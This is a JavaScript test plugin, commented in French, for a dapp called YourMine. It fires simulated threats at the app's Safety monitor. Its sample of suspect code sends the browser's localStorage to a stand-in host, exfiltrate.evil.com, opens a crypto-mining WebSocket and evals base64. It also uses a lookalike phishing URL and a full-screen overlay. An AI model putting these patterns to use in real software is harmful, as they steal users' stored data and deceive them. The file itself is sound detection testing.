/* bomb-test.sphere.js — YourMine Safety Test
   Sphere conçue pour déclencher toutes les alertes Safety.
   Usage : activer cette sphere avec Safety actif et observer les warnings.
*/
(function(){
'use strict';
window.YM_S = window.YM_S || {};

window.YM_S['bomb.sphere.js'] = {
  name:        'Bomb Test',
  icon:        '💣',
  category:    'Test',
  description: 'Tests de détection Safety — URLs suspectes, code malveillant simulé, transactions.',
  version:     '1.0.0',

  async activate(ctx) {
    ctx.toast('💣 Bomb Test activé — lancement des tests Safety', 'warn');

    // Test 1 : URL de phishing
    await new Promise(r => setTimeout(r, 1000));
    window.dispatchEvent(new CustomEvent('ym:safety-test', {
      detail: { type: 'url', url: 'https://yourmine-dapp.web.app.evil-hacker.com/steal-wallet' }
    }));

    // Test 2 : Transaction suspecte
    await new Promise(r => setTimeout(r, 2000));
    window.dispatchEvent(new CustomEvent('ym:before-transaction', {
      detail: {
        amount: 99999,
        destination: 'Hs7JZMF3veNyWzDCFjkGWf9TqHiV2mZqW9KkVbTq3abc',
        program: 'unknown_program_id'
      }
    }));

    // Test 3 : Tentative de couvrir le DOM avec z-index élevé
    await new Promise(r => setTimeout(r, 3000));
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(255,0,0,0.3);z-index:99999;display:flex;align-items:center;justify-content:center;font-size:24px;color:#fff;pointer-events:none';
    overlay.textContent = '💣 TEST OVERLAY z-index:99999 — Safety toast devrait passer par-dessus';
    document.body.appendChild(overlay);
    setTimeout(() => overlay.remove(), 3000);
  },

  renderPanel(container) {
    container.style.cssText = 'padding:16px;display:flex;flex-direction:column;gap:12px';
    container.innerHTML = `
      <div class="ym-card">
        <div style="font-family:var(--font-d);font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--red,#ff4560);margin-bottom:10px">⚠ Safety Test Suite</div>
        <div style="font-size:12px;color:var(--text2);line-height:1.7">
          Cette sphère teste le système Safety en simulant des actions dangereuses.<br>
          Active Safety Monitor avec le modèle chargé avant de lancer les tests.
        </div>
      </div>
      <div class="ym-card" id="btest-results" style="font-size:11px;color:var(--text3);min-height:60px">
        Résultats des tests s'afficheront ici…
      </div>
      <div style="display:flex;flex-direction:column;gap:8px">
        <button class="ym-btn ym-btn-accent" id="btest-url">🌐 Test URL phishing</button>
        <button class="ym-btn ym-btn-ghost" id="btest-tx">💸 Test transaction suspecte</button>
        <button class="ym-btn ym-btn-ghost" id="btest-overlay">👁 Test z-index overlay</button>
        <button class="ym-btn ym-btn-ghost" id="btest-code">⬡ Test code suspect</button>
        <button class="ym-btn" style="background:rgba(255,69,96,.15);border:1px solid rgba(255,69,96,.3);color:#ff4560" id="btest-all">💣 Tout lancer</button>
      </div>
    `;

    const results = container.querySelector('#btest-results');
    const log = (msg, color='var(--text2)') => {
      const line = document.createElement('div');
      line.style.cssText = `color:${color};padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)`;
      line.textContent = new Date().toLocaleTimeString() + ' — ' + msg;
      results.appendChild(line);
      results.scrollTop = results.scrollHeight;
    };
    results.innerHTML = '';

    // Test URL phishing
    container.querySelector('#btest-url').onclick = async () => {
      log('→ Test URL phishing…', 'var(--text3)');
      const url = 'https://yourmine-dapp.web.app.evil-hacker.com/steal-wallet?token=abc123';
      if (window.YM?.loadSphereFromURL) {
        const result = await window.YM.loadSphereFromURL(url, 'evil-app');
        log('Résultat: ' + (result ? 'chargé (non détecté)' : 'bloqué ✓'), result ? '#ff4560' : '#22d98a');
      } else {
        // Dispatch direct pour que Safety intercepte
        window.dispatchEvent(new CustomEvent('ym:safety-test-url', { detail: { url } }));
        log('Dispatché: ' + url, 'var(--cyan)');
      }
    };

    // Test transaction
    container.querySelector('#btest-tx').onclick = () => {
      log('→ Test transaction suspecte…', 'var(--text3)');
      window.dispatchEvent(new CustomEvent('ym:before-transaction', {
        detail: { amount: 99999, destination: 'Hs7JZMF3veNyWzDCFjkGWf9Tq3abc', program: 'malicious_drain_program' }
      }));
      log('Event ym:before-transaction dispatché', 'var(--cyan)');
    };

    // Test overlay z-index
    container.querySelector('#btest-overlay').onclick = () => {
      log('→ Injection overlay z-index:99999…', 'var(--text3)');
      const o = document.createElement('div');
      o.style.cssText = 'position:fixed;inset:0;background:rgba(255,0,0,.4);z-index:99999;display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;pointer-events:none';
      o.textContent = '💣 OVERLAY z-index:99999 — Safety toast visible ?';
      document.body.appendChild(o);
      window.YM_toast?.('Safety toast au-dessus de l\'overlay ?', 'warn');
      setTimeout(() => { o.remove(); log('Overlay retiré après 3s', '#22d98a'); }, 3000);
      log('Overlay injecté — Safety toasts z-index:10002 devrait passer par-dessus', 'var(--cyan)');
    };

    // Test code suspect
    container.querySelector('#btest-code').onclick = () => {
      log('→ Simulation activation sphere avec code suspect…', 'var(--text3)');
      window.dispatchEvent(new CustomEvent('ym:sphere-before-activate', {
        detail: {
          filename: 'evil-miner.sphere.js',
          author: 'unknown_hacker',
          code: `
            // Crypto miner
            const ws = new WebSocket('wss://mining-pool.evil.com');
            fetch('https://exfiltrate.evil.com/data', {
              method: 'POST',
              body: JSON.stringify(localStorage)
            });
            eval(atob('bWFsaWNpb3VzY29kZQ=='));
          `
        }
      }));
      log('Event ym:sphere-before-activate dispatché', 'var(--cyan)');
    };

    // Tout lancer
    container.querySelector('#btest-all').onclick = async () => {
      log('💣 Lancement de tous les tests…', '#ff4560');
      for (const id of ['#btest-url','#btest-tx','#btest-overlay','#btest-code']) {
        container.querySelector(id).click();
        await new Promise(r => setTimeout(r, 800));
      }
      log('Tous les tests lancés ✓', '#22d98a');
    };
  },
};

})();
